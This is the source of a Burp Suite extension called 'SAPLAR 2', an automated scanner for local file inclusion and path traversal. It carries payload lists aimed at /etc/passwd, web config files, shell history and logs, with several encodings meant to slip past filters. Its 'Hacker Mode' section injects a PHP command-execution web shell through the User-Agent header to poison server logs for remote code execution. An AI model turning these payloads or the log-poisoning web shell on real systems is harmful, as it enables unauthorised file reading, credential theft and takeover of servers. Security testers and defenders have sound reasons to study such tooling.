# -*- coding: utf-8 -*-
import sys
import base64
import zlib
import re
import hashlib
import difflib
import threading

# Java imports
from java.lang import Object, Runnable, Comparable
from java.util import ArrayList, Comparator
from java.util.concurrent import Executors, TimeUnit
from java.awt import BorderLayout, Color, GridBagLayout, GridBagConstraints
from java.awt.event import ActionListener
from javax.swing import (
    JMenuItem, JPanel, JScrollPane, JTable, JSplitPane,
    JTextArea, JTabbedPane, SwingUtilities, JCheckBox, BoxLayout, JLabel,
    JButton, JTextField, JComboBox
)
from javax.swing.table import DefaultTableModel, DefaultTableCellRenderer, TableRowSorter
from java.io import PrintWriter

from burp import (
    IBurpExtender,
    IScannerCheck,
    IScanIssue,
    IContextMenuFactory,
    IHttpListener,
    ITab,
    IParameter
)

try:
    from urllib import quote  # Py2
except ImportError:
    from urllib.parse import quote  # Py3

# Sometimes we need to adjust unicode settings in Jython environments
try:
    reload(sys)
    sys.setdefaultencoding('utf-8')
except:
    pass

############################################################################
# PLUGIN NAME
############################################################################
EXTENSION_NAME = "SAPLAR 2"

############################################################################
# LFI PAYLOAD SETS
############################################################################
BASE_LFI_PAYLOADS = [
    # Unix
    "../../../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../etc/passwd",
    "../../etc/passwd",
    "../../../../../../etc/passwd%00",
    "../../../../../../etc/passwd%2500",
    "/proc/self/environ",
    "....//....//etc/passwd",
    # Windows
    "C:\\Windows\\win.ini",
    "C:/Windows/win.ini",
    "C:\\windows\\system.ini",
    # PHP Wrappers
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://input",
    "php://filter/resource=index.php",
    "expect://ls",
    "data://text/plain;base64,aGVsbG8=",
    # Null byte / '#' at the end
    "../../../../../../windows/win.ini%00",
    "../../../../../../etc/passwd#",
]
CUSTOM_FILES = [
    "../../../../../../var/www/html/config.php",
    "../../../../../../var/www/html/database.php",
    "../../../../../../home/user/.bash_history",
    "../../../../../../var/log/apache2/access.log",
    "../../../../../../var/log/apache2/error.log",
    "../../../../../../etc/nginx/nginx.conf",
    "../../../../../../boot.ini",
    "../../nohup.out",
]
LOG_POISONING_PAYLOADS = [
    "../../../../../../var/log/apache2/access.log",
    "../../../../../../var/log/nginx/error.log",
]

############################################################################
# ENCODING FUNCTIONS
############################################################################
def double_url_encode(payload):
    once = quote(payload)
    return quote(once)

def triple_url_encode(payload):
    first = quote(payload)
    second = quote(first)
    return quote(second)

def unicode_escape(payload):
    return ''.join('\\u{:04x}'.format(ord(c)) for c in payload)

def mixed_encoding(payload):
    rev = payload[::-1]
    b64 = base64.b64encode(rev.encode()).decode()
    return quote(b64)

ENCODING_METHODS = [
    lambda x: x,  # plain
    lambda x: base64.b64encode(x.encode()).decode(),  # Base64
    lambda x: quote(x),  # URL-encode
    lambda x: ''.join(['%%%02X' % ord(c) for c in x]),
    double_url_encode,
    triple_url_encode,
    unicode_escape,
    mixed_encoding,
]

############################################################################
# LFI / ERROR / FALSE POSITIVE SIGNATURES
############################################################################
LFI_SIGNATURES = [
    "root:x:0:0",
    "bin:x:1:1",
    "daemon:x:2:2",
    "Windows Registry Editor",
    "kernel.core_pattern",
    r"uid=.*\(root\)",
]
LFI_ERROR_PATTERNS = [
    "no such file or directory",
    "failed to open stream",
    "open_basedir restriction",
    "warning: include",
    "warning: require",
    "system cannot find the path specified",
    "permission denied",
]
FALSE_POSITIVE_INDICATORS = [
    "403 forbidden",
    "404 not found",
    "not found",
    "forbidden",
]

############################################################################
# HELPER FUNCTIONS
############################################################################
def decompress_response(response_bytes):
    try:
        return zlib.decompress(response_bytes, 16 + zlib.MAX_WBITS).decode("utf-8", "replace")
    except:
        return response_bytes

def deduplicateKey(urlObj, param_name, param_type):
    host = urlObj.getHost()
    path = urlObj.getPath() or ""
    base_str = u"%s%s|%s|%s" % (host, path, param_name, str(param_type))
    return hashlib.md5(base_str.encode('utf-8')).hexdigest()

def parseHeaders(rawRequest):
    lines = rawRequest.split("\r\n")
    headers_dict = {}
    for line in lines[1:]:
        if not line.strip() or ":" not in line:
            break
        name, val = line.split(":", 1)
        headers_dict[name.strip()] = val.strip()
    return headers_dict

def buildRawRequestWithHeaders(rawRequest, newHeadersDict):
    lines = rawRequest.split("\r\n")
    request_line = lines[0]
    idx = 0
    for i, line in enumerate(lines[1:], start=1):
        if not line.strip():
            idx = i
            break
    old_body = ""
    if idx > 0 and idx < len(lines) - 1:
        old_body = "\r\n".join(lines[idx+1:])

    new_header_lines = []
    for k, v in newHeadersDict.items():
        new_header_lines.append("{}: {}".format(k, v))

    newRaw = request_line + "\r\n" + "\r\n".join(new_header_lines) + "\r\n\r\n" + old_body
    return newRaw

def response_diff_score(original, new):
    sm = difflib.SequenceMatcher(None, original, new)
    ratio = sm.quick_ratio()
    return 1.0 - ratio

############################################################################
# LFIResult + Renderer
############################################################################
class LFIResult(object):
    def __init__(self, url, param, payload, status, request, response):
        self.url = url
        self.param = param
        self.payload = payload
        self.status = status
        self.request = request
        self.response = response

class LfiCellRenderer(DefaultTableCellRenderer):
    def getTableCellRendererComponent(self, table, value, isSelected, hasFocus, row, column):
        component = super(LfiCellRenderer, self).getTableCellRendererComponent(
            table, value, isSelected, hasFocus, row, column
        )
        status_value = table.getModel().getValueAt(row, 3)
        if status_value is None:
            status_value = ""

        if isSelected:
            component.setBackground(table.getSelectionBackground())
            component.setForeground(table.getSelectionForeground())
        else:
            lower_status = status_value.strip().lower()
            if lower_status == "exploited":
                component.setBackground(Color(255, 150, 150))  # Red
            else:
                component.setBackground(Color.white)
            component.setForeground(Color.black)

        return component

############################################################################
# StatusComparator (Exploited -> Top priority)
############################################################################
class StatusComparator(Comparator):
    """
    "Exploited" entries should appear at the top in sorting.
    """
    def compare(self, o1, o2):
        p1 = self._priority(o1)
        p2 = self._priority(o2)
        if p1 < p2:
            return -1
        elif p1 > p2:
            return 1
        else:
            return 0

    def _priority(self, st):
        if not st:
            return 99
        stlow = st.lower()
        if "exploited" in stlow:
            return 1
        elif "suspectederror" in stlow:
            return 2
        elif "notexploited" in stlow:
            return 3
        elif "possible lfi" in stlow:
            return 4
        else:
            return 99

############################################################################
# ADVANCED (Hacker Mode) Functions (Under Development)
############################################################################
def poisonLogs(callbacks, baseRequestResponse, lfiUrl, logPath="/var/log/apache2/access.log"):
    """
    1) Inject PHP code into logs (User-Agent: <?php system($_GET['cmd']);?>)
    2) LFI param = logPath -> RCE
    This is just an example. In real scenarios, paramName might need customizing.
    """
    if not baseRequestResponse:
        return "[!] baseRequestResponse=None, can't poison logs."

    service = baseRequestResponse.getHttpService()
    paramHeader = "User-Agent"
    injection = "<?php system($_GET['cmd']); ?>"

    raw_req = baseRequestResponse.getRequest()
    helpers = callbacks.getHelpers()
    raw_str = helpers.bytesToString(raw_req)

    old_headers = parseHeaders(raw_str)
    old_headers[paramHeader] = injection
    new_req_str = buildRawRequestWithHeaders(raw_str, old_headers)
    new_req_bytes = helpers.stringToBytes(new_req_str)

    poisonResp = callbacks.makeHttpRequest(service, new_req_bytes)
    if poisonResp:
        return "[*] Log poisoning attempt completed => Try LFI with path=%s" % logPath
    return "[!] Log poison attempt failed or no response."

def tryPharExploit(callbacks, baseRequestResponse, lfiUrl):
    """
    A pseudo phar exploit approach:
    1) Upload a .phar polyglot
    2) LFI => phar://uploads/shell.jpg
    """
    return "[*] Phar exploit attempt simulated."

def trySessionUpload(callbacks, baseRequestResponse, lfiUrl):
    """
    session.upload_progress => RCE path
    1) Large file upload + progress param
    2) LFI => /var/lib/php/sessions/sess_{id}
    """
    return "[*] Session upload progress attempt simulated."

def tryNginxTmp(callbacks, baseRequestResponse, lfiUrl):
    """
    Nginx large request body => /var/lib/nginx/tmp/client_body*
    LFI => RCE
    """
    return "[*] Nginx temporary body attempt simulated."

############################################################################
# HackerModeListener
############################################################################
class HackerModeListener(ActionListener):
    def __init__(self, extender):
        self._extender = extender

    def actionPerformed(self, e):
        table = self._extender._table
        selRows = table.getSelectedRows()
        if len(selRows) == 0:
            self._extender.logToHackerTab("[HackerMode] No row selected.")
            return

        for r in selRows:
            modelRow = table.convertRowIndexToModel(r)
            lfiResult = self._extender._results[modelRow]
            self._extender.executor.submit(lambda: self._extender.runHackerMode(lfiResult))

############################################################################
# Start/Stop/Clear ActionListener
############################################################################
class StartScanListener(ActionListener):
    def __init__(self, extender):
        self._extender = extender

    def actionPerformed(self, e):
        self._extender.scanningStopped = False
        try:
            tval = int(self._extender.threadField.getText())
            if 1 <= tval <= 200:
                self._extender.defaultThreadCount = tval
        except:
            pass
        self._extender.createExecutor()
        self._extender._stdout.println("[*] Scan started: threadCount=%d" % self._extender.defaultThreadCount)

class StopScanListener(ActionListener):
    def __init__(self, extender):
        self._extender = extender

    def actionPerformed(self, e):
        self._extender._stdout.println("[*] Scan STOP requested.")
        self._extender.scanningStopped = True

class ClearResultsListener(ActionListener):
    def __init__(self, extender):
        self._extender = extender

    def actionPerformed(self, e):
        self._extender._stdout.println("[*] Clear results triggered.")
        with self._extender._lock:
            rowCount = self._extender._tableModel.getRowCount()
            for r in range(rowCount-1, -1, -1):
                self._extender._tableModel.removeRow(r)
            self._extender._results = []
            self._extender.scannedRequests = set()
            self._extender.vulnerableParams = set()
        # Also clear the Hacker Mode output
        self._extender.clearHackerTab()

############################################################################
# Main Extension (IBurpExtender, etc.)
############################################################################
class BurpExtender(IBurpExtender, IScannerCheck, IContextMenuFactory, IHttpListener, ITab):

    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        self._stdout = PrintWriter(callbacks.getStdout(), True)
        self._stderr = PrintWriter(callbacks.getStderr(), True)

        callbacks.setExtensionName(EXTENSION_NAME)

        callbacks.registerScannerCheck(self)
        callbacks.registerContextMenuFactory(self)
        callbacks.registerHttpListener(self)

        self.scanningStopped = False
        self.threadsActive = 0
        self.defaultThreadCount = 5
        self._lock = threading.Lock()

        self.scannedRequests = set()
        self.vulnerableParams = set()

        self.executor = None
        self.createExecutor()

        # === GUI ===
        self._mainPanel = JPanel(BorderLayout())
        topPanel = JPanel()
        topPanel.setLayout(GridBagLayout())
        gbc = GridBagConstraints()
        gbc.fill = GridBagConstraints.HORIZONTAL
        gbc.gridx = 0
        gbc.gridy = 0

        # Parameter type checkboxes
        self.checkUrlParams = JCheckBox("Scan URL Params", True)
        self.checkBodyParams = JCheckBox("Scan Body Params", True)
        self.checkCookieParams = JCheckBox("Scan Cookie Params", True)
        try:
            _ = IParameter.PARAM_HEADER
            self.checkHeaderParams = JCheckBox("Scan Header Params", True)
        except:
            self.checkHeaderParams = JCheckBox("Scan Header Params [Not Supported]", False)
            self.checkHeaderParams.setEnabled(False)

        self.checkAllHeaders = JCheckBox("Inject ALL Headers", False)
        self.checkAllCookies = JCheckBox("Inject ALL Cookies", False)
        self.checkProxyActive = JCheckBox("Auto-Scan Proxy (Active)", False)
        self.checkProxyPassive = JCheckBox("Auto-Scan Proxy (Passive)", False)

        # Thread, payload, and buttons
        self.threadLabel = JLabel("Threads:")
        self.threadField = JTextField(str(self.defaultThreadCount), 3)
        self.payloadLabel = JLabel("Payload Set:")
        self.payloadCombo = JComboBox(["Default + Custom", "Default + Custom + LogPoisoning"])

        self.btnStartScan = JButton("Start Scan")
        self.btnStopScan = JButton("Stop Scan")
        self.btnClearResults = JButton("Clear Results")
        self.btnStartScan.addActionListener(StartScanListener(self))
        self.btnStopScan.addActionListener(StopScanListener(self))
        self.btnClearResults.addActionListener(ClearResultsListener(self))

        # Hacker Mode button
        self.btnHackerMode = JButton("Hacker Mode RCE")
        self.btnHackerMode.addActionListener(HackerModeListener(self))

        # Layout for the top panel
        topPanel.add(self.checkUrlParams, gbc); gbc.gridx += 1
        topPanel.add(self.checkBodyParams, gbc); gbc.gridx += 1
        topPanel.add(self.checkCookieParams, gbc); gbc.gridx = 0; gbc.gridy += 1
        topPanel.add(self.checkHeaderParams, gbc); gbc.gridx += 1
        topPanel.add(self.checkAllHeaders, gbc); gbc.gridx += 1
        topPanel.add(self.checkAllCookies, gbc); gbc.gridx = 0; gbc.gridy += 1
        topPanel.add(self.checkProxyActive, gbc); gbc.gridx += 1
        topPanel.add(self.checkProxyPassive, gbc); gbc.gridx += 1

        gbc.gridx = 0; gbc.gridy += 1
        topPanel.add(self.threadLabel, gbc); gbc.gridx += 1
        topPanel.add(self.threadField, gbc); gbc.gridx += 1
        topPanel.add(self.payloadLabel, gbc); gbc.gridx += 1
        topPanel.add(self.payloadCombo, gbc); gbc.gridx = 0; gbc.gridy += 1
        topPanel.add(self.btnStartScan, gbc); gbc.gridx += 1
        topPanel.add(self.btnStopScan, gbc); gbc.gridx += 1
        topPanel.add(self.btnClearResults, gbc); gbc.gridx += 1

        # Hacker Mode
        gbc.gridx = 0; gbc.gridy += 1
        topPanel.add(self.btnHackerMode, gbc)

        self._mainPanel.add(topPanel, BorderLayout.PAGE_START)

        # === Table & model ===
        self._tableModel = DefaultTableModel(["URL", "Parameter", "Payload", "Status"], 0)
        self._table = JTable(self._tableModel)
        self._table.setFillsViewportHeight(True)

        self._rowSorter = TableRowSorter(self._tableModel)
        self._rowSorter.setComparator(3, StatusComparator())
        self._table.setRowSorter(self._rowSorter)
        self._table.setDefaultRenderer(Object, LfiCellRenderer())

        # Bottom panel: 1) Request, 2) Response, 3) Hacker Output
        self._detailTabs = JTabbedPane()
        self._requestTextArea = JTextArea()
        self._responseTextArea = JTextArea()
        self._hackerTextArea = JTextArea()  # Hacker Mode Output

        self._detailTabs.addTab("Request", JScrollPane(self._requestTextArea))
        self._detailTabs.addTab("Response", JScrollPane(self._responseTextArea))
        self._detailTabs.addTab("Hacker Mode Output", JScrollPane(self._hackerTextArea))

        splitPane = JSplitPane(JSplitPane.VERTICAL_SPLIT, JScrollPane(self._table), self._detailTabs)
        splitPane.setDividerLocation(220)
        self._mainPanel.add(splitPane, BorderLayout.CENTER)

        self._results = []
        def onRowSelection(e):
            if e.getValueIsAdjusting():
                return
            row = self._table.getSelectedRow()
            if row >= 0:
                modelRow = self._table.convertRowIndexToModel(row)
                res = self._results[modelRow]
                self._requestTextArea.setText(res.request)
                self._responseTextArea.setText(res.response)

        self._table.getSelectionModel().addListSelectionListener(onRowSelection)

        callbacks.addSuiteTab(self)
        self._stdout.println("[+] SAPLAR LFI & Path Traversal Scanner Extension (Hacker Mode) loaded!")

    #
    # Helper to log messages to the Hacker Mode tab
    #
    def logToHackerTab(self, text):
        def run():
            self._hackerTextArea.append(text + "\n")
        SwingUtilities.invokeLater(run)

    def clearHackerTab(self):
        def run():
            self._hackerTextArea.setText("")
        SwingUtilities.invokeLater(run)

    def createExecutor(self):
        if self.executor:
            self.executor.shutdownNow()
        self.executor = Executors.newFixedThreadPool(self.defaultThreadCount)

    #
    # ITab
    #
    def getTabCaption(self):
        return EXTENSION_NAME

    def getUiComponent(self):
        return self._mainPanel

    #
    # runHackerMode => All “advanced” RCE attempts
    # (Under Development)
    #
    def runHackerMode(self, lfiResult):
        # Log to the Hacker Mode tab
        self.logToHackerTab("[HackerMode] Starting advanced RCE attempts for => %s" % lfiResult.url)

        baseReqResp = None
        # If you saved the full RequestResponse in the table, you could parse it here.
        # runHackerMode pseudocode

        # 1) Log Poisoning
        msg1 = poisonLogs(self._callbacks, baseReqResp, lfiResult.url, "/var/log/apache2/access.log")
        self.logToHackerTab(msg1)

        # 2) Phar
        msg2 = tryPharExploit(self._callbacks, baseReqResp, lfiResult.url)
        self.logToHackerTab(msg2)

        # 3) session.upload_progress
        msg3 = trySessionUpload(self._callbacks, baseReqResp, lfiResult.url)
        self.logToHackerTab(msg3)

        # 4) Nginx tmp
        msg4 = tryNginxTmp(self._callbacks, baseReqResp, lfiResult.url)
        self.logToHackerTab(msg4)

        self.logToHackerTab("[HackerMode] Completed advanced RCE attempts => %s" % lfiResult.url)

    #
    # IContextMenuFactory
    #
    def createMenuItems(self, invocation):
        menu = ArrayList()
        menu.add(JMenuItem("🔍 LFI Scan", actionPerformed=lambda _: self.startLfiScan(invocation)))
        return menu

    def startLfiScan(self, invocation):
        msgs = invocation.getSelectedMessages()
        if not msgs:
            return
        self._stdout.println("[+] Manual LFI scan triggered.")
        for m in msgs:
            self.executor.submit(lambda: self.doActiveScan(m, None))

    #
    # IHttpListener
    #
    def processHttpMessage(self, toolFlag, isRequest, messageInfo):
        if self.scanningStopped:
            return

        # If Proxy is selected => either request or response
        if isRequest and self.checkProxyActive.isSelected():
            self.executor.submit(lambda: self.doActiveScan(messageInfo, None))
        elif (not isRequest) and self.checkProxyPassive.isSelected():
            self.executor.submit(lambda: self.doPassiveScan(messageInfo))

    #
    # IScannerCheck
    #
    def doPassiveScan(self, baseRequestResponse):
        if self.scanningStopped:
            return None
        try:
            raw_resp = baseRequestResponse.getResponse()
            if not raw_resp:
                return None
            res_info = self._helpers.analyzeResponse(raw_resp)
            if not res_info:
                return None

            headers = res_info.getHeaders()
            status_code = res_info.getStatusCode()
            if any("Content-Encoding: gzip" in h for h in headers):
                body_str = decompress_response(raw_resp)
            else:
                body_str = self._helpers.bytesToString(raw_resp)

            lfi_found = self.advancedLfiDetection(body_str)
            if lfi_found["exploit"] or lfi_found["error"]:
                url_str = str(self._helpers.analyzeRequest(baseRequestResponse).getUrl())
                snippet = body_str[:500]
                self._stdout.println("[!] Passive LFI Indication -> %s" % url_str)
                pass_lfiResult = LFIResult(
                    url_str,
                    "N/A (Passive Scan)",
                    "N/A",
                    "Possible LFI (Passive)",
                    "",
                    "[Status: %d]\n%s\n\n%s" % (status_code, "\n".join(headers), snippet)
                )
                self.addScanResult(pass_lfiResult)
        except Exception as e:
            self._stderr.println("[ERROR] doPassiveScan: %s" % str(e))
        return None

    def doActiveScan(self, baseRequestResponse, insertionPoint):
        with self._lock:
            self.threadsActive += 1
        try:
            if not baseRequestResponse:
                return

            request_info = self._helpers.analyzeRequest(baseRequestResponse)
            urlObj = request_info.getUrl()
            url_str = str(urlObj)

            base_resp = baseRequestResponse.getResponse()
            original_resp_str = ""
            if base_resp:
                if any("Content-Encoding: gzip" in line for line in self._helpers.analyzeResponse(base_resp).getHeaders()):
                    original_resp_str = decompress_response(base_resp)
                else:
                    original_resp_str = self._helpers.bytesToString(base_resp)

            parameters = request_info.getParameters()
            param_types_to_scan = []
            if self.checkUrlParams.isSelected():
                param_types_to_scan.append(IParameter.PARAM_URL)
            if self.checkBodyParams.isSelected():
                param_types_to_scan.append(IParameter.PARAM_BODY)
            if self.checkCookieParams.isSelected():
                param_types_to_scan.append(IParameter.PARAM_COOKIE)
            try:
                if IParameter.PARAM_HEADER and self.checkHeaderParams.isSelected():
                    param_types_to_scan.append(IParameter.PARAM_HEADER)
            except:
                pass

            selectedPayloadMode = self.payloadCombo.getSelectedItem()
            final_lfi_payloads = list(BASE_LFI_PAYLOADS) + list(CUSTOM_FILES)
            if "LogPoisoning" in selectedPayloadMode:
                final_lfi_payloads += LOG_POISONING_PAYLOADS

            # Header/Cookie param scanning
            if self.checkAllHeaders.isSelected() or self.checkAllCookies.isSelected():
                self.injectAllHeadersAndCookies(baseRequestResponse, final_lfi_payloads, original_resp_str)

            for param in parameters:
                if self.scanningStopped:
                    return
                if param.getType() not in param_types_to_scan:
                    continue

                param_name = param.getName()
                param_type = param.getType()

                dedup_key = deduplicateKey(urlObj, param_name, param_type)
                if dedup_key in self.scannedRequests:
                    continue
                self.scannedRequests.add(dedup_key)

                if dedup_key in self.vulnerableParams:
                    continue

                for payload in final_lfi_payloads:
                    if self.scanningStopped:
                        return
                    found_exploit = False

                    for encode_func in ENCODING_METHODS:
                        if self.scanningStopped:
                            return
                        encoded_payload = encode_func(payload)
                        new_request = self._helpers.updateParameter(
                            baseRequestResponse.getRequest(),
                            self._helpers.buildParameter(param_name, encoded_payload, param_type)
                        )
                        attackResp = self._callbacks.makeHttpRequest(
                            baseRequestResponse.getHttpService(),
                            new_request
                        )
                        if not attackResp:
                            continue

                        raw_attack_response = attackResp.getResponse()
                        if not raw_attack_response:
                            continue

                        res_info = self._helpers.analyzeResponse(raw_attack_response)
                        if not res_info:
                            continue
                        headers2 = res_info.getHeaders()
                        status_code = res_info.getStatusCode()

                        if any("Content-Encoding: gzip" in h for h in headers2):
                            body_str = decompress_response(raw_attack_response)
                        else:
                            body_str = self._helpers.bytesToString(raw_attack_response)

                        detect = self.advancedLfiDetection(body_str)
                        if detect["exploit"]:
                            self._stdout.println("[DEBUG] Exploit signature matched => param=%s payload=%s" % (param_name, payload))
                            if self.isFalsePositive(body_str, status_code):
                                self.recordNotExploited(url_str, param_name, encoded_payload, "FP", new_request, headers2, body_str)
                            else:
                                self.recordExploit(url_str, param_name, encoded_payload, new_request, headers2, body_str, status_code)
                                self.vulnerableParams.add(dedup_key)
                                found_exploit = True
                                break
                        elif detect["error"]:
                            self.recordSuspectedError(url_str, param_name, encoded_payload, new_request, headers2, body_str, status_code)
                        else:
                            self.recordNotExploited(url_str, param_name, encoded_payload, "", new_request, headers2, body_str)

                    if found_exploit:
                        break
        except Exception as e:
            self._stderr.println("[ERROR] doActiveScan: %s" % str(e))
        finally:
            with self._lock:
                self.threadsActive -= 1

    #
    # LFI Detection
    #
    def advancedLfiDetection(self, body_str):
        result = {"exploit": False, "error": False}
        for sig in LFI_SIGNATURES:
            pattern = re.compile(sig, re.IGNORECASE)
            match_obj = pattern.search(body_str)
            if match_obj:
                self._stdout.println("[DEBUG] Matched exploit signature: %s" % sig)
                result["exploit"] = True
                break
            b64sig = base64.b64encode(sig.encode()).decode()
            if b64sig in body_str:
                self._stdout.println("[DEBUG] Matched exploit signature (Base64): %s" % sig)
                result["exploit"] = True
                break

        if not result["exploit"]:
            for err in LFI_ERROR_PATTERNS:
                if re.search(err, body_str, re.IGNORECASE):
                    result["error"] = True
                    break
        return result

    def isFalsePositive(self, body_str, status_code):
        if status_code in [401, 403, 404]:
            return True
        low = body_str.lower()
        for fp in FALSE_POSITIVE_INDICATORS:
            if fp in low:
                return True
        return False

    #
    # Logging Methods
    #
    def addScanResult(self, lfiResult):
        with self._lock:
            self._results.append(lfiResult)
            rowData = [lfiResult.url, lfiResult.param, lfiResult.payload, lfiResult.status]
            def addRow():
                self._tableModel.addRow(rowData)
            SwingUtilities.invokeLater(addRow)

    def recordNotExploited(self, url_str, param, payload, reason, requestBytes, headers, body_str):
        if reason:
            status = "NotExploited(%s)" % reason
        else:
            status = "NotExploited"

        request_str = ""
        body_len = len(body_str)
        headers_joined = "\n".join(headers)
        resp_str = "[Minimal Info]\nHeadersLen=%d BodyLen=%d\n" % (len(headers_joined), body_len)
        self.addScanResult(LFIResult(url_str, param, payload, status, request_str, resp_str))

    def recordExploit(self, url_str, param, payload, requestBytes, headers, body_str, status_code):
        request_str = self._helpers.bytesToString(requestBytes)
        resp_headers = "\n".join(headers)
        response_full = "[Status: {}]\n{}\n\n{}".format(status_code, resp_headers, body_str)
        self.addScanResult(LFIResult(url_str, param, payload, "Exploited", request_str, response_full))

    def recordSuspectedError(self, url_str, param, payload, requestBytes, headers, body_str, status_code):
        status = "SuspectedError"
        request_str = self._helpers.bytesToString(requestBytes)
        resp_headers = "\n".join(headers)
        snippet = body_str[:500]
        response_full = "[Status: {}]\n{}\n\n{}".format(status_code, resp_headers, snippet)
        self.addScanResult(LFIResult(url_str, param, payload, status, request_str, response_full))

    #
    # Header/Cookie Scanning
    #
    def injectAllHeadersAndCookies(self, baseRequestResponse, payload_list, original_resp_str):
        if not baseRequestResponse:
            return
        raw_req_bytes = baseRequestResponse.getRequest()
        if not raw_req_bytes:
            return
        raw_req_str = self._helpers.bytesToString(raw_req_bytes)

        original_headers = parseHeaders(raw_req_str)
        cookies_str = original_headers.get("Cookie", None)

        # All cookie params
        if cookies_str and self.checkAllCookies.isSelected():
            cookies = {}
            parts = cookies_str.split(";")
            for part in parts:
                part = part.strip()
                if "=" in part:
                    cName, cVal = part.split("=", 1)
                    cookies[cName.strip()] = cVal.strip()

            for cName in cookies.keys():
                if self.scanningStopped:
                    return
                for p in payload_list:
                    if self.scanningStopped:
                        return
                    for encf in ENCODING_METHODS:
                        if self.scanningStopped:
                            return
                        enc_payload = encf(p)
                        new_cookies = dict(cookies)
                        new_cookies[cName] = enc_payload
                        newCookieVal = "; ".join(["{}={}".format(k, v) for k, v in new_cookies.items()])
                        mod_headers = dict(original_headers)
                        mod_headers["Cookie"] = newCookieVal
                        newRaw = buildRawRequestWithHeaders(raw_req_str, mod_headers)
                        newRequestBytes = self._helpers.stringToBytes(newRaw)

                        attackResp = self._callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), newRequestBytes)
                        if not attackResp:
                            continue
                        self.analyzeManualHeaderAttack(p, cName, newRequestBytes, attackResp, original_resp_str)

        # All header params
        if self.checkAllHeaders.isSelected():
            for hKey in original_headers.keys():
                if self.scanningStopped:
                    return
                if hKey.lower() in ["host", "cookie", "content-length"]:
                    continue
                for p in payload_list:
                    if self.scanningStopped:
                        return
                    for encf in ENCODING_METHODS:
                        if self.scanningStopped:
                            return
                        enc_payload = encf(p)
                        mod_headers = dict(original_headers)
                        mod_headers[hKey] = enc_payload
                        newRaw = buildRawRequestWithHeaders(raw_req_str, mod_headers)
                        newRequestBytes = self._helpers.stringToBytes(newRaw)

                        attackResp = self._callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), newRequestBytes)
                        if not attackResp:
                            continue
                        self.analyzeManualHeaderAttack(p, hKey, newRequestBytes, attackResp, original_resp_str)

    def analyzeManualHeaderAttack(self, payload, headerName, requestBytes, attackResp, original_resp_str):
        if not attackResp:
            return
        raw_attack_response = attackResp.getResponse()
        if not raw_attack_response:
            return

        res_info = self._helpers.analyzeResponse(raw_attack_response)
        if not res_info:
            return

        headers2 = res_info.getHeaders()
        status_code = res_info.getStatusCode()

        if any("Content-Encoding: gzip" in h for h in headers2):
            body_str = decompress_response(raw_attack_response)
        else:
            body_str = self._helpers.bytesToString(raw_attack_response)

        detect = self.advancedLfiDetection(body_str)
        if detect["exploit"]:
            self._stdout.println("[DEBUG] Exploit signature matched in header=%s with payload=%s" % (headerName, payload))
            if self.isFalsePositive(body_str, status_code):
                self.recordNotExploited("HeaderAttack", headerName, payload, "FP", requestBytes, headers2, body_str)
            else:
                self.recordExploit("HeaderAttack", headerName, payload, requestBytes, headers2, body_str, status_code)
        elif detect["error"]:
            self.recordSuspectedError("HeaderAttack", headerName, payload, requestBytes, headers2, body_str, status_code)
        else:
            self.recordNotExploited("HeaderAttack", headerName, payload, "", requestBytes, headers2, body_str)


############################################################################
# Optional IScanIssue
############################################################################
class LFISAPLAR(IScanIssue):
    def __init__(self, baseRequestResponse, attackRequest, attackResponse, payload):
        self._httpService = baseRequestResponse.getHttpService()
        self._requestResponse = baseRequestResponse
        self._attackRequestResponse = attackResponse
        self._issueDetail = "Possible LFI detected with payload: " + payload
        self._issueName = "LFI Vulnerability"
        self._severity = "High"
        self._confidence = "Certain"
        self._helpers = None

    def getUrl(self):
        return self._helpers.analyzeRequest(self._requestResponse).getUrl()

    def getIssueName(self):
        return self._issueName

    def getIssueType(self):
        return 0

    def getSeverity(self):
        return self._severity

    def getConfidence(self):
        return "Tentative"

    def getIssueBackground(self):
        return None

    def getRemediationBackground(self):
        return None

    def getIssueDetail(self):
        return self._issueDetail

    def getRemediationDetail(self):
        return None

    def getHttpMessages(self):
        return [self._requestResponse, self._attackRequestResponse]

    def getHttpService(self):
        return self._httpService
